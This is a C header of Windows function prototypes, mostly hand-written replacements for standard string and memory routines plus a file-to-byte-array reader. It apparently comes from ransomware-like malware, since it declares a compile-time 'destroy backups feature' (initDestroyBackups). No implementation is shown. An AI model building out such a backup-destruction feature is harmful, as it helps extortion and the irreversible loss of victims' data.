#include <windows.h>
#include <Shlwapi.h>

#define STRSAFE_E_INSUFFICIENT_BUFFER 0x8007007AL
//#define DESTROY_BACKUPS  // Uncomment this line to enable the destroy backups feature

#ifdef DESTROY_BACKUPS
void initDestroyBackups();
#endif

int _wcscmp(const wchar_t* s1, const wchar_t* s2);
wchar_t* _wcsstr(const wchar_t* haystack, const wchar_t* needle);
wchar_t* _itowOwn(int value, wchar_t* buffer, int radix);
size_t _wcslen(const wchar_t* str);
int _wcsncmp(const wchar_t* s1, const wchar_t* s2, size_t n);
void my_memcpy(void* dest, const void* src, int size);
size_t my_strlen(const char* str);
void strcpy_own(char* dest, const char* src);
void strncpy_own(char* dest, const char* src, size_t n);
void strcat_own(char* dest, const char* src);
int strcmp_own(const char *s1, const char *s2);
void memset_own(void* dest, int c, size_t n);
int writeToConsoleA(const char* text);
int writeToConsoleW(const wchar_t* text);
//BOOL stringToByteArray(const char* str, PBYTE* byteArray, DWORD* byteArrayLen);
BOOL ReadFileWToByteArray(const WCHAR* szFileName, PBYTE* lpBuffer, PDWORD dwDataLen, PULONG64 dwFileSize);
//BOOL ReadFileAToByteArray(const char* szFileName, PBYTE* lpBuffer, PDWORD dwDataLen);
void* _wmemcpy(wchar_t* destination, const wchar_t* source, size_t count);
errno_t _wcscpy_s(wchar_t* destination, size_t sizeInWords, const wchar_t* source);
errno_t _wcscat_s(wchar_t* destination, size_t sizeInWords, const wchar_t* source);
void* _wmemcpy(wchar_t* destination, const wchar_t* source, size_t count);
HRESULT _StringCchCopyW(wchar_t* destination, size_t sizeInWords, const wchar_t* source);
HRESULT _StringCchCatW(wchar_t* destination, size_t sizeInWords, const wchar_t* source);
void ShowDebugMessage(const WCHAR* prefix, const WCHAR* content);
void reverse(wchar_t* str, int len);
double my_pow(double base, int exponent);
int intToWStr(int x, wchar_t str[], int d);
void int_to_wchar(int num, wchar_t* str);
void ftoa(float n, wchar_t* res, int afterpoint);